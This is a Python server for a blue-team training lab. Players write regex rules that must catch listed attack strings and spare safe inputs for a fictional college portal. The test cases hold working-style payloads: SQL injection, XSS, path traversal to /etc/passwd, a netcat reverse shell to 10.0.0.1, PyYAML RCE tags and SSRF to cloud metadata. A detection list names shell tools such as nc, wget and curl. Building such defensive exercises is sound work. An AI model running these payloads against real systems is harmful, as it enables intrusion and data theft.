"""
Vidyatech — Blue Team Monitor + Regex Patch Submission System
=============================================================
Blue Team must WRITE a regex rule to patch each vulnerability.
The rule is validated against test cases before being activated.
No penalty for wrong attempts — retry freely.

Run:    python monitor/server.py
Access: http://localhost:8080
"""

import os, re, time, threading, json, http.server
from datetime import datetime
import urllib.request

# ─────────────────────────── CONFIG ──────────────────────────────────────────

LOG_FILE     = os.environ.get("LOG_FILE",     "/tmp/vidyatech_access.log")
PATCHES_FILE = os.environ.get("PATCHES_FILE", "/tmp/vidyatech_patches.json")
FLASK_URL    = os.environ.get("FLASK_URL",    "http://127.0.0.1:5000")
PATCH_SECRET = os.environ.get("PATCH_SECRET", "NEXSUS_BLUE_2024")
SESSION_DURATION = int(os.environ.get("SESSION_DURATION", 7200))  # 2 hours in seconds

SESSION_START = time.time()

# ─────────────────────────── PATCH STATE ─────────────────────────────────────

def read_patches() -> dict:
    try:
        if os.path.exists(PATCHES_FILE):
            with open(PATCHES_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def write_patches(patches: dict):
    try:
        with open(PATCHES_FILE, "w") as f:
            json.dump(patches, f, indent=2)
    except Exception as e:
        print(f"[Monitor] Could not write patches file: {e}")

def activate_patch(vuln_id: str, name: str, user_regex: str) -> dict:
    patches = read_patches()
    patches[vuln_id] = True
    patches[f"{vuln_id}__regex"] = user_regex          # store submitted regex
    patches[f"{vuln_id}__ts"]    = datetime.now().strftime("%H:%M:%S")
    write_patches(patches)

    try:
        payload = json.dumps({"vuln_id": vuln_id, "enabled": True, "name": name}).encode()
        req = urllib.request.Request(
            f"{FLASK_URL}/api/patch",
            data=payload,
            headers={"Content-Type": "application/json", "X-Patch-Secret": PATCH_SECRET},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass

    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(
                f"{datetime.now().strftime('%H:%M:%S')} "
                f"[BLUE_TEAM] PATCH_APPLIED | vuln={vuln_id} | name={name} | "
                f"regex={user_regex!r} | ip=monitor | status=200\n"
            )
    except Exception:
        pass
    return patches

def deactivate_patch(vuln_id: str, name: str) -> dict:
    patches = read_patches()
    patches[vuln_id] = False
    patches.pop(f"{vuln_id}__regex", None)
    patches.pop(f"{vuln_id}__ts",    None)
    write_patches(patches)

    try:
        payload = json.dumps({"vuln_id": vuln_id, "enabled": False, "name": name}).encode()
        req = urllib.request.Request(
            f"{FLASK_URL}/api/patch",
            data=payload,
            headers={"Content-Type": "application/json", "X-Patch-Secret": PATCH_SECRET},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass

    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(
                f"{datetime.now().strftime('%H:%M:%S')} "
                f"[BLUE_TEAM] PATCH_REVERTED | vuln={vuln_id} | name={name} | "
                f"ip=monitor | status=200\n"
            )
    except Exception:
        pass
    return patches

# ─────────────────────────── VULN CATALOGUE + VALIDATION SPEC ────────────────
#
# Each vuln has:
#   must_match  – list of attack strings the regex MUST match (real attacks)
#   must_block  – list of safe strings the regex must NOT match (false positives)
#   hint        – one-line hint shown under the input
#   field_label – what part of the request to match against
#   placeholder – example regex shown greyed out in the input

VULNS = [
    {
        "num": 1, "id": "sqli_login", "name": "SQL Injection",
        "type": "SQL Injection", "endpoint": "POST /login", "level": "Easy",
        "fix_summary": "Block SQL meta-characters in login body",
        "field_label": "Match against: request body (roll_no field)",
        "placeholder": "e.g.  '\\s*OR\\s*'|--|UNION|SELECT",
        "hint": "Attack payloads contain  ' OR '1'='1'--  or UNION SELECT. Safe logins are plain roll numbers like VTU2021001.",
        "must_match": [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "UNION SELECT * FROM students",
            "1'; DROP TABLE students;--",
            "admin'--",
        ],
        "must_block": [
            "VTU2021001",
            "arjun123",
            "roll_no=VTU2021002&password=priya456",
        ],
    },
    {
        "num": 2, "id": "stored_xss", "name": "Stored XSS",
        "type": "XSS", "endpoint": "POST /notices/post", "level": "Easy",
        "fix_summary": "Block HTML script/event-handler injection in notice content",
        "field_label": "Match against: notice content / title field",
        "placeholder": "e.g.  <script|javascript:|onerror=|onload=|<img",
        "hint": "XSS payloads contain <script>, onerror=, javascript:, or <img src=x>. Normal notices are plain text.",
        "must_match": [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
        ],
        "must_block": [
            "Exam schedule has been released for all students.",
            "Hackathon registrations are open.",
            "Library will remain open till 10 PM.",
        ],
    },
    {
        "num": 3, "id": "default_creds", "name": "Default Credentials",
        "type": "Auth", "endpoint": "POST /staff/login", "level": "Easy",
        "fix_summary": "Block known default passwords in staff login",
        "field_label": "Match against: request body (password field)",
        "placeholder": "e.g.  admin123|faculty2024|anjali@123|kiran2024",
        "hint": "Default passwords are admin123, faculty2024, anjali@123, kiran2024. Block only these exact values.",
        "must_match": [
            "admin123",
            "faculty2024",
            "anjali@123",
            "kiran2024",
        ],
        "must_block": [
            "N3wStr0ngP@ss!",
            "SecurePass2024",
            "MyCustomPassword",
        ],
    },
    {
        "num": 4, "id": "dir_traversal", "name": "Directory Traversal",
        "type": "Path Traversal", "endpoint": "GET /resources/download", "level": "Easy",
        "fix_summary": "Block ../ and URL-encoded path traversal sequences",
        "field_label": "Match against: URL query string (?file= parameter)",
        "placeholder": "e.g.  \\.\\./|%2e%2e|%2f|\\.\\.",
        "hint": "Traversal uses ../ or URL-encoded variants like %2e%2e%2f. Safe requests ask for filenames only like syllabus_cse.pdf.",
        "must_match": [
            "../../etc/passwd",
            "../data/db_backup_jan2024.sql",
            "%2e%2e%2fetc%2fpasswd",
            "..%2f..%2fetc%2fpasswd",
            "....//....//etc/passwd",
        ],
        "must_block": [
            "syllabus_cse.pdf",
            "academic_calendar.pdf",
            "lecture_notes.pdf",
        ],
    },
    {
        "num": 5, "id": "data_exposure", "name": "Sensitive Data Exposure",
        "type": "Info Leak", "endpoint": "/robots.txt  /.env", "level": "Easy",
        "fix_summary": "Detect recon requests for .env and robots.txt",
        "field_label": "Match against: request URL path",
        "placeholder": "e.g.  /\\.env|/robots\\.txt|/backup|\\.sql",
        "hint": "Recon hits /robots.txt, /.env, or /backup paths. Normal paths are /, /login, /dashboard, etc.",
        "must_match": [
            "GET /.env",
            "GET /robots.txt",
            "/backup/db.sql",
            "/data/db_backup_jan2024.sql",
        ],
        "must_block": [
            "GET /login",
            "GET /dashboard",
            "POST /notices/post",
            "GET /about",
        ],
    },
    {
        "num": 6, "id": "hardcoded_admin", "name": "Hardcoded Admin Login",
        "type": "Auth", "endpoint": "POST /admin/login", "level": "Easy",
        "fix_summary": "Block the hardcoded default admin credentials",
        "field_label": "Match against: request body (username + password)",
        "placeholder": "e.g.  admin@123|password=admin@123",
        "hint": "The hardcoded password is admin@123. Block any login attempt using this exact password value.",
        "must_match": [
            "admin@123",
            "username=admin&password=admin@123",
            "password=admin@123",
        ],
        "must_block": [
            "username=admin&password=N3wStr0ngP@ss!",
            "password=SecureAdminPass99",
        ],
    },
    {
        "num": 7, "id": "doc_upload_bypass", "name": "Unrestricted File Upload",
        "type": "File Upload", "endpoint": "POST /dashboard/upload-doc", "level": "Easy",
        "fix_summary": "Allow only .pdf files in student document uploads",
        "field_label": "Match against: uploaded filename (block non-PDF)",
        "placeholder": "e.g.  \\.(php|exe|sh|js|html|phtml|py)$",
        "hint": "Only .pdf should be allowed. Block any other extension — .php .exe .sh .html .py .phtml etc.",
        "must_match": [
            "malware.exe",
            "shell.php",
            "backdoor.py",
            "exploit.html",
            "reverse.sh",
        ],
        "must_block": [
            "transcript.pdf",
            "resume.pdf",
            "certificate.pdf",
        ],
    },
    {
        "num": 8, "id": "clickjacking_fix", "name": "Clickjacking",
        "type": "Missing X-Frame-Options", "endpoint": "Any page", "level": "Easy",
        "fix_summary": "Add X-Frame-Options: DENY header to all responses",
        "field_label": "Match against: request URL path",
        "placeholder": "e.g.  /login|/dashboard|/admin",
        "hint": "Any request to a page that can be framed is a clickjacking risk. Block iframe embedding by detecting missing X-Frame-Options.",
        "must_match": [
            "GET /login",
            "GET /dashboard",
            "GET /admin/login",
        ],
        "must_block": [
            "POST /api/patch",
            "GET /static/style.css",
        ],
    },
    {
        "num": 9, "id": "weak_password", "name": "Weak Password Policy",
        "type": "Auth", "endpoint": "POST /account/change-password", "level": "Easy",
        "fix_summary": "Reject passwords shorter than 8 characters",
        "field_label": "Match against: new_password field in request body",
        "placeholder": "e.g.  new_password=.{1,7}(&|$)",
        "hint": "Weak passwords are 1-7 characters. Safe passwords are 8+ characters.",
        "must_match": [
            "new_password=1",
            "new_password=abc",
            "new_password=1234567",
        ],
        "must_block": [
            "new_password=Str0ngP@ss",
            "new_password=SecurePass1",
            "new_password=MyPassword99",
        ],
    },
    {
        "num": 10, "id": "csrf_email", "name": "CSRF — Email Hijack",
        "type": "CSRF", "endpoint": "POST /account/update-email", "level": "Easy",
        "fix_summary": "Detect cross-origin POST requests to the email update endpoint",
        "field_label": "Match against: request URL path + method",
        "placeholder": "e.g.  POST /account/update-email",
        "hint": "Any POST to /account/update-email is a potential CSRF attack. Safe requests are GET only.",
        "must_match": [
            "POST /account/update-email",
            "/account/update-email | body=email=attacker@evil.com",
        ],
        "must_block": [
            "GET /account/update-email",
            "POST /login",
        ],
    },
    {
        "num": 11, "id": "jwt_alg_none", "name": "JWT alg:none",
        "type": "Auth Bypass", "endpoint": "GET /api/me", "level": "Intermediate",
        "fix_summary": "Detect forged JWT tokens with alg=none header",
        "field_label": "Match against: Authorization header value",
        "placeholder": "e.g.  alg.*none|eyJ.*\\\"alg\\\".*\\\"none\\\"",
        "hint": "Forged tokens have alg:none in the base64 header. The base64 of {\"alg\":\"none\"} starts with eyJhbGciOiJub25lIn0. Real tokens use HS256.",
        "must_match": [
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdHVkZW50X2lkIjoxfQ.',
            '"alg":"none"',
            'alg=none',
            'eyJhbGciOiJub25lIn0',
        ],
        "must_block": [
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdHVkZW50X2lkIjoxfQ.abc123',
            'Bearer validtoken123',
        ],
    },
    {
        "num": 12, "id": "idor", "name": "IDOR",
        "type": "Access Control", "endpoint": "GET /api/result/<id>", "level": "Intermediate",
        "fix_summary": "Detect enumeration of result IDs beyond the logged-in user",
        "field_label": "Match against: request URL path",
        "placeholder": "e.g.  /api/result/[2-9]|/api/result/[0-9]{2,}",
        "hint": "Student VTU2021001 (id=1) only has results 1-2. Any request for /api/result/3 or higher is IDOR.",
        "must_match": [
            "/api/result/3",
            "/api/result/4",
            "/api/result/5",
            "/api/result/6",
            "/api/result/99",
        ],
        "must_block": [
            "/api/result/1",
            "/api/result/2",
        ],
    },
    {
        "num": 13, "id": "cmd_injection", "name": "Command Injection",
        "type": "RCE", "endpoint": "POST /tools/nslookup", "level": "Intermediate",
        "fix_summary": "Block shell metacharacters in DNS lookup input",
        "field_label": "Match against: domain field in request body",
        "placeholder": "e.g.  ;|\\||&&|`|\\$\\(|whoami|cat |ls ",
        "hint": "Injections use ; | && ` $() followed by shell commands. A normal domain is vidyatech.edu or google.com.",
        "must_match": [
            "vidyatech.edu; whoami",
            "google.com && cat /etc/passwd",
            "test.com | ls -la",
            "x.com; nc -e /bin/sh 10.0.0.1 4444",
            "`id`",
            "$(whoami)",
        ],
        "must_block": [
            "vidyatech.edu",
            "google.com",
            "8.8.8.8",
            "example.org",
        ],
    },
    {
        "num": 14, "id": "yaml_rce", "name": "YAML RCE",
        "type": "RCE", "endpoint": "POST /tools/yaml-import", "level": "Advanced",
        "fix_summary": "Block PyYAML object deserialization payloads",
        "field_label": "Match against: yaml_input field in request body",
        "placeholder": "e.g.  !!python|python/object|unsafe_load",
        "hint": "YAML RCE payloads use !!python/object/apply tags. Safe YAML is plain key:value data.",
        "must_match": [
            "!!python/object/apply:subprocess.check_output",
            "!!python/object/apply:os.system",
            "!!python/object:subprocess.Popen",
            "!!python/object/new:os.system",
        ],
        "must_block": [
            "name: John Doe",
            "department: Engineering",
            "roll_no: VTU2025001",
        ],
    },
    {
        "num": 15, "id": "block_debug", "name": "Debug Endpoint + SSRF",
        "type": "Info Leak / SSRF", "endpoint": "GET /debug  POST /tools/fetch-url", "level": "Advanced",
        "fix_summary": "Block /debug access and internal IP requests in fetch-url",
        "field_label": "Match against: request URL path or url= body param",
        "placeholder": "e.g.  /debug|127\\.0\\.0\\.1|169\\.254",
        "hint": "GET /debug leaks the secret key. POST /tools/fetch-url with internal IPs is SSRF. Block both.",
        "must_match": [
            "GET /debug",
            "url=http://127.0.0.1:5000/debug",
            "url=http://169.254.169.254/latest/meta-data/",
        ],
        "must_block": [
            "GET /dashboard",
            "url=https://google.com",
        ],
    },
]

# Build a quick lookup dict by id
VULN_BY_ID = {v["id"]: v for v in VULNS}

# ─────────────────────────── REGEX VALIDATOR ─────────────────────────────────

def validate_regex(pattern: str, vuln_id: str) -> dict:
    """
    Validate the submitted regex pattern against the vuln's test suite.

    Returns:
        {
          "ok": bool,
          "error": str | None,          # compile error
          "passed": [...],              # must_match strings correctly caught
          "missed": [...],              # must_match strings NOT caught  (bad)
          "blocked": [...],             # must_block strings NOT matched (good)
          "false_positives": [...],     # must_block strings wrongly matched (bad)
          "score": "X/Y",
        }
    """
    spec = VULN_BY_ID.get(vuln_id)
    if not spec:
        return {"ok": False, "error": f"Unknown vuln_id: {vuln_id}"}

    # 1. Compile
    try:
        compiled = re.compile(pattern, re.IGNORECASE)
    except re.error as e:
        return {"ok": False, "error": f"Regex compile error: {e}",
                "passed": [], "missed": [], "blocked": [], "false_positives": [],
                "score": "0/0"}

    # 2. Check must_match
    passed, missed = [], []
    for s in spec["must_match"]:
        if compiled.search(s):
            passed.append(s)
        else:
            missed.append(s)

    # 3. Check must_block (false-positive check)
    blocked, false_positives = [], []
    for s in spec["must_block"]:
        if compiled.search(s):
            false_positives.append(s)
        else:
            blocked.append(s)

    total    = len(spec["must_match"]) + len(spec["must_block"])
    correct  = len(passed) + len(blocked)
    ok       = (len(missed) == 0 and len(false_positives) == 0)

    return {
        "ok":              ok,
        "error":           None,
        "passed":          passed,
        "missed":          missed,
        "blocked":         blocked,
        "false_positives": false_positives,
        "score":           f"{correct}/{total}",
    }

# ─────────────────────────── ATTACK DETECTION ────────────────────────────────

ATTACK_PATTERNS = [
    (r"'.*OR.*'|'.*--|\bUNION\b.*\bSELECT\b|\bSELECT\b.*\bFROM\b",  "SQL Injection",                "HIGH",     "#ff4757"),
    (r"body=cmd=exploit\s+1\b",                         "Simulated SQL Injection",      "MEDIUM",   "#ffa502"),
    (r"<script|javascript:|onerror=|onload=",           "Stored XSS",                  "HIGH",     "#ff4757"),
    (r"body=cmd=exploit\s+2\b",                         "Simulated Stored XSS",         "MEDIUM",   "#ffa502"),
    (r"\.\./|\.\.\%2f|\.\.%2F",                         "Directory Traversal",          "HIGH",     "#ff4757"),
    (r"body=cmd=exploit\s+4\b",                         "Simulated Directory Traversal","MEDIUM",   "#ffa502"),
    (r"(?:;|\||&)\s*(whoami|id|cat|ls|nc|bash|sh|wget|curl|cmd|ping)", "Command Injection", "CRITICAL", "#ff0000"),
    (r"body=cmd=exploit\s+8\b",                         "Simulated Command Injection",  "HIGH",     "#ff4757"),
    (r"\.php5|\.phtml|\.phar|\.shtml",                  "Malicious File Upload",        "CRITICAL", "#ff0000"),
    (r"body=cmd=exploit\s+9\b",                         "Simulated File Upload",        "HIGH",     "#ff4757"),
    (r"/robots\.txt|/\.env|/backup",                    "Recon / Data Exposure",        "LOW",      "#ffa502"),
    (r"body=cmd=exploit\s+5\b",                         "Simulated Data Exposure",      "LOW",      "#94a3b8"),
    (r"/api/result/[2-9]|/api/result/[0-9]{2}",        "IDOR Attempt",                 "MEDIUM",   "#ffa502"),
    (r"body=cmd=exploit\s+7\b",                         "Simulated IDOR",               "MEDIUM",   "#ffa502"),
    (r"alg.*none|eyJ.*none",                            "JWT alg:none Attempt",         "HIGH",     "#ff4757"),
    (r"body=cmd=(?:jwt|exploit\s+6\b)",                 "Simulated JWT Attack",         "MEDIUM",   "#ffa502"),
    (r"/admin/login.*admin",                            "Hardcoded Admin Login",        "HIGH",     "#ff4757"),
    (r"body=cmd=exploit\s+11\b",                        "Simulated Admin Login",        "MEDIUM",   "#ffa502"),
    (r"/staff/login|FAC00[1-9]",                        "Staff Portal Probe",           "MEDIUM",   "#ffa502"),
    (r"body=cmd=exploit\s+3\b",                         "Simulated Staff Portal Probe", "MEDIUM",   "#ffa502"),
    (r"POST /account/update-email.*(?i:email=)",        "CSRF",                         "MEDIUM",   "#ffa502"),
    (r"body=cmd=exploit\s+10\b",                        "Simulated CSRF",               "MEDIUM",   "#ffa502"),
    (r"POST /student/document/upload .*filename=(?![^|]*\.pdf(?:\s|\||$))[^|]+", "Unrestricted Doc Upload", "CRITICAL", "#ff0000"),
    (r"body=cmd=exploit\s+12\b",                        "Simulated Doc Upload",         "HIGH",     "#ff4757"),
    # ── ADVANCED VULNS ──
    (r"!!python/object|yaml\.unsafe_load|/tools/yaml-import", "YAML RCE Attempt",       "CRITICAL", "#ff0000"),
    (r"body=cmd=exploit\s+9\b",                         "Simulated YAML RCE",           "HIGH",     "#ff4757"),
    (r"GET /debug",                                     "Debug Endpoint Probe",         "HIGH",     "#ff4757"),
    (r"flask\.unsign|secret_key.*forge|forged.*session", "Session Cookie Forgery",      "CRITICAL", "#ff0000"),
    (r"body=cmd=exploit\s+13\b",                        "Simulated Debug/Session Forge","HIGH",     "#ff4757"),
    # SSRF: only match when 127.0.0.1 or internal IPs appear in body/url param, not in ip= field
    (r"body=[^|]*(?:127\.0\.0\.1|169\.254\.169\.254|file://|/api/internal)|url=[^|]*(?:127\.0\.0\.1|169\.254\.169\.254)", "SSRF Attempt", "CRITICAL", "#ff0000"),
    (r"body=cmd=exploit\s+14\b",                        "Simulated SSRF",               "HIGH",     "#ff4757"),
    # ── EASY VULNS ──
    (r"<iframe.*src=.*localhost|X-Frame-Options",       "Clickjacking Attempt",         "MEDIUM",   "#ffa502"),
    (r"new_password=.{1,7}(&|$|\s)",                    "Weak Password Attempt",        "MEDIUM",   "#ffa502"),
    (r"POST /account/update-email",                     "CSRF Email Hijack",            "HIGH",     "#ff4757"),
    (r"sqlmap|nikto|burpsuite|hydra|nmap",              "Automated Scanner",            "HIGH",     "#ff4757"),
    (r"sleep\(|SLEEP\(|WAITFOR|benchmark\(",            "Blind SQLi Attempt",           "HIGH",     "#ff4757"),
    (r"\[BLUE_TEAM\] PATCH_APPLIED",                    "Patch Applied",                "LOW",      "#00e5ff"),
    (r"\[BLUE_TEAM\] PATCH_REVERTED",                   "Patch Reverted",               "LOW",      "#94a3b8"),
    (r"\[BLUE_TEAM\] ADVANCED_PATCH",                   "Advanced Patch Toggled",       "LOW",      "#00e5ff"),
    (r"body=cmd=(?!(?:help|clear|cls|score|hint)\b).+","Simulated Terminal Command",    "LOW",      "#94a3b8"),
]

events        = []
stats         = {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0}
attack_counts = {}  # {attack_name: {count, color, severity, last, blocked, hit}}
exploit_successes = []  # confirmed successful exploits (not patched)
_last_line_hash = None  # deduplicate consecutive identical log lines

# Regexes to pull structured fields out of a Flask access log line
_RE_METHOD_PATH = re.compile(r'^\d{2}:\d{2}:\d{2}\s+(GET|POST|PUT|DELETE|PATCH|HEAD)\s+(\S+)')
_RE_IP          = re.compile(r'ip=(\d{1,3}(?:\.\d{1,3}){3})')
_RE_STATUS      = re.compile(r'status=(\d{3})')
_RE_BODY        = re.compile(r'body=(.+?)(?:\s*\||\s*$)')

def _extract_fields(line: str) -> dict:
    fields = {"ip": "—", "method": "—", "endpoint": "—", "status": "—", "body": ""}
    m = _RE_METHOD_PATH.match(line.strip())
    if m:
        fields["method"]   = m.group(1)
        fields["endpoint"] = m.group(2).split("?")[0]
    ip = _RE_IP.search(line)
    if ip:
        fields["ip"] = ip.group(1)
    st = _RE_STATUS.search(line)
    if st:
        fields["status"] = st.group(1)
    bd = _RE_BODY.search(line)
    if bd:
        fields["body"] = bd.group(1).strip()[:120]
    return fields

_NAME_TO_VID = {
    "SQL Injection": "sqli_login", "Simulated SQL Injection": "sqli_login",
    "Stored XSS": "stored_xss", "Simulated Stored XSS": "stored_xss",
    "Staff Portal Probe": "default_creds", "Simulated Staff Portal Probe": "default_creds",
    "Directory Traversal": "dir_traversal", "Simulated Directory Traversal": "dir_traversal",
    "Recon / Data Exposure": "data_exposure", "Simulated Data Exposure": "data_exposure",
    "JWT alg:none Attempt": "jwt_alg_none", "Simulated JWT Attack": "jwt_alg_none",
    "IDOR Attempt": "idor", "Simulated IDOR": "idor",
    "Command Injection": "cmd_injection", "Simulated Command Injection": "cmd_injection",
    "YAML RCE Attempt": "yaml_rce", "Simulated YAML RCE": "yaml_rce",
    "Debug Endpoint Probe": "block_debug", "Session Cookie Forgery": "block_debug",
    "Simulated Debug/Session Forge": "block_debug",
    "SSRF Attempt": "ssrf_block", "Simulated SSRF": "ssrf_block",
    "Clickjacking Attempt": "clickjacking_fix",
    "Weak Password Attempt": "weak_password",
    "CSRF Email Hijack": "csrf_email",
    "Malicious File Upload": "file_upload_rce", "Simulated File Upload": "file_upload_rce",
    "CSRF": "csrf", "Simulated CSRF": "csrf",
    "Hardcoded Admin Login": "hardcoded_admin", "Simulated Admin Login": "hardcoded_admin",
    "Unrestricted Doc Upload": "doc_upload_bypass", "Simulated Doc Upload": "doc_upload_bypass",
    "Blind SQLi Attempt": "sqli_login", "Automated Scanner": "",
}

def analyze(line: str):
    global _last_line_hash
    # Deduplicate: skip if this line (ignoring timestamp) is identical to the last one
    line_body = line[9:].strip() if len(line) > 9 else line.strip()
    line_hash = hash(line_body)
    if line_hash == _last_line_hash:
        return
    _last_line_hash = line_hash

    patches = read_patches()
    for pattern, name, severity, color in ATTACK_PATTERNS:
        if re.search(pattern, line, re.IGNORECASE):
            fields       = _extract_fields(line)
            ts           = datetime.now().strftime("%H:%M:%S")
            vid          = _NAME_TO_VID.get(name, "")
            patch_active = bool(patches.get(vid, False)) if vid else False

            ev = {
                "time":     ts,
                "type":     name,
                "severity": severity,
                "color":    color,
                "raw":      line.strip()[:160],
                "ip":       fields["ip"],
                "method":   fields["method"],
                "endpoint": fields["endpoint"],
                "status":   fields["status"],
                "body":     fields["body"],
                "patched":  patch_active,
                "blocked":  "BLOCKED" if patch_active else "HIT",
            }
            events.insert(0, ev)
            if len(events) > 300:
                events.pop()
            stats["total"] += 1
            stats[severity.lower()] = stats.get(severity.lower(), 0) + 1

            # Grouped attack-type counters
            if name not in attack_counts:
                attack_counts[name] = {"count": 0, "color": color,
                                       "severity": severity, "last": ts,
                                       "blocked": 0, "hit": 0}
            attack_counts[name]["count"] += 1
            attack_counts[name]["last"]   = ts
            if patch_active:
                attack_counts[name]["blocked"] += 1
            else:
                attack_counts[name]["hit"] += 1
                # ── Record confirmed exploit success ──
                if vid:
                    vuln_name = next((v["name"] for v in VULNS if v["id"] == vid), name)
                    vuln_level = next((v["level"] for v in VULNS if v["id"] == vid), "")
                    exploit_successes.insert(0, {
                        "time":      ts,
                        "vuln_name": vuln_name,
                        "vuln_id":   vid,
                        "level":     vuln_level,
                        "attack":    name,
                        "ip":        fields["ip"],
                        "endpoint":  fields["endpoint"],
                        "color":     color,
                        "severity":  severity,
                    })
                    if len(exploit_successes) > 100:
                        exploit_successes.pop()
            break

# ─────────────────────────── HTML PAGE BUILDER ───────────────────────────────

def build_page() -> str:
    patches = read_patches()

    # ── Session timer ──
    elapsed = int(time.time() - SESSION_START)
    session_remaining = max(0, SESSION_DURATION - elapsed)
    sev_styles = {
        "CRITICAL": "background:rgba(255,0,0,0.15);color:#ff5555;border:1px solid rgba(255,0,0,0.3)",
        "HIGH":     "background:rgba(255,71,87,0.12);color:#ff4757;border:1px solid rgba(255,71,87,0.3)",
        "MEDIUM":   "background:rgba(255,165,2,0.12);color:#ffa502;border:1px solid rgba(255,165,2,0.3)",
        "LOW":      "background:rgba(100,116,139,0.12);color:#94a3b8;border:1px solid rgba(100,116,139,0.2)",
    }

    # ── Compact event rows (legacy table, still shown) ──
    rows = ""
    for ev in events[:60]:
        ss  = sev_styles.get(ev["severity"], "")
        raw = ev["raw"].replace("<", "&lt;").replace(">", "&gt;")
        blk  = ev.get("blocked", "HIT")
        blk_style2 = (
            "color:#00ff88;font-weight:700" if blk == "BLOCKED" else "color:#ff4757;font-weight:700"
        )
        rows += (
            f'<tr>'
            f'<td style="color:#64748b;white-space:nowrap;font-family:monospace">{ev["time"]}</td>'
            f'<td style="color:{ev["color"]};font-weight:600">{ev["type"]}</td>'
            f'<td style="color:#64748b;font-family:monospace;font-size:11px">{ev.get("ip","—")}</td>'
            f'<td style="color:#475569;font-family:monospace;font-size:11px">{ev.get("endpoint","—")}</td>'
            f'<td><span style="padding:2px 10px;border-radius:4px;font-size:11px;font-weight:700;{ss}">{ev["severity"]}</span></td>'
            f'<td style="{blk_style2};font-size:11px;font-family:monospace">'
            f'{"&#128274; BLOCKED" if blk=="BLOCKED" else "&#9888; HIT"}</td>'
            f'<td style="color:#94a3b8;font-size:11px;max-width:380px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:monospace">{raw}</td>'
            f'</tr>'
        )
    if not rows:
        rows = '<tr><td colspan="7" style="text-align:center;padding:2.5rem;color:#475569;">No attacks detected yet — system is clean</td></tr>'

    total_patched   = sum(1 for v in VULNS if patches.get(v["id"], False))
    patch_bar_w     = int((total_patched / len(VULNS)) * 100)
    patch_bar_color = "#00ff88" if patch_bar_w == 100 else ("#ffa502" if patch_bar_w >= 50 else "#ff4757")

    # ── Patch control rows ──
    patch_rows = ""
    for v in VULNS:
        vid, name    = v["id"], v["name"]
        patched      = patches.get(vid, False)
        stored_regex = patches.get(f"{vid}__regex", "")
        stored_ts    = patches.get(f"{vid}__ts",    "")
        lv           = v["level"]
        lv_color     = "#00ff88" if lv == "Easy" else "#ffa502"
        lv_bg        = "rgba(0,255,136,0.08)" if lv == "Easy" else "rgba(255,165,2,0.08)"
        lv_border    = "rgba(0,255,136,0.3)"  if lv == "Easy" else "rgba(255,165,2,0.3)"

        escaped_placeholder = v["placeholder"].replace("'", "\\'")
        escaped_hint        = v["hint"].replace("<", "&lt;").replace(">", "&gt;")
        escaped_field       = v["field_label"]
        escaped_regex       = stored_regex.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

        if patched:
            status_block = (
                f'<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">'
                f'<span style="display:inline-block;width:9px;height:9px;border-radius:50%;background:#00ff88"></span>'
                f'<span style="color:#00ff88;font-weight:700;font-size:12px">PATCHED at {stored_ts}</span>'
                f'</div>'
                f'<div style="font-family:\'JetBrains Mono\',monospace;font-size:11px;color:#64748b;'
                f'background:#060d18;border:1px solid #1a2535;border-radius:4px;padding:6px 10px;'
                f'margin-bottom:10px;word-break:break-all;">'
                f'Active rule: <span style="color:#00e5ff">{escaped_regex}</span>'
                f'</div>'
                f'<button onclick="revertPatch(\'{vid}\',\'{name}\')" '
                f'style="cursor:pointer;padding:5px 14px;border-radius:4px;font-size:11px;font-weight:700;font-family:monospace;'
                f'background:rgba(100,116,139,0.15);color:#94a3b8;border:1px solid rgba(100,116,139,0.3);transition:all 0.2s">'
                f'&#8629; Revert patch</button>'
            )
        else:
            status_block = (
                f'<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">'
                f'<span style="display:inline-block;width:9px;height:9px;border-radius:50%;background:#ff4757;animation:pulse 1.4s infinite"></span>'
                f'<span style="color:#ff4757;font-weight:700;font-size:12px">VULNERABLE — write a regex rule below</span>'
                f'</div>'
                f'<div style="font-size:11px;color:#64748b;margin-bottom:6px">{escaped_field}</div>'
                f'<div style="display:flex;gap:8px;align-items:flex-start">'
                f'  <div style="flex:1">'
                f'    <input id="regex-{vid}" type="text" '
                f'      style="width:100%;background:#060d18;border:1px solid #1a2535;border-radius:4px;'
                f'      padding:8px 12px;color:#dde4f0;font-family:\'JetBrains Mono\',monospace;font-size:12px;'
                f'      outline:none;transition:border 0.2s" '
                f'      onfocus="this.style.border=\'1px solid #00e5ff\'" '
                f'      onblur="this.style.border=\'1px solid #1a2535\'" '
                f'      onkeydown="if(event.key===\'Enter\')submitRegex(\'{vid}\',\'{name}\')">'
                f'    <div id="result-{vid}" style="margin-top:6px;font-size:11px;font-family:monospace;min-height:16px"></div>'
                f'  </div>'
                f'  <button onclick="submitRegex(\'{vid}\',\'{name}\')" '
                f'    style="cursor:pointer;padding:8px 16px;border-radius:4px;font-size:12px;font-weight:700;font-family:monospace;'
                f'    background:rgba(0,229,255,0.1);color:#00e5ff;border:1px solid rgba(0,229,255,0.3);'
                f'    white-space:nowrap;transition:all 0.2s;flex-shrink:0">'
                f'    &#10003; Validate &amp; Apply'
                f'  </button>'
                f'</div>'
            )

        patch_rows += (
            f'<tr id="row-{vid}" style="border-bottom:1px solid rgba(26,37,53,0.8)">'
            f'<td style="color:#475569;font-size:12px;vertical-align:top;padding-top:16px">#{v["num"]}</td>'
            f'<td style="vertical-align:top;padding-top:16px">'
            f'  <div style="font-weight:700;color:#dde4f0;margin-bottom:2px">{name}</div>'
            f'  <div style="font-size:11px;color:#64748b">{v["type"]}</div>'
            f'</td>'
            f'<td style="font-family:monospace;font-size:11px;color:#475569;vertical-align:top;padding-top:16px;white-space:nowrap">{v["endpoint"]}</td>'
            f'<td style="vertical-align:top;padding-top:14px">'
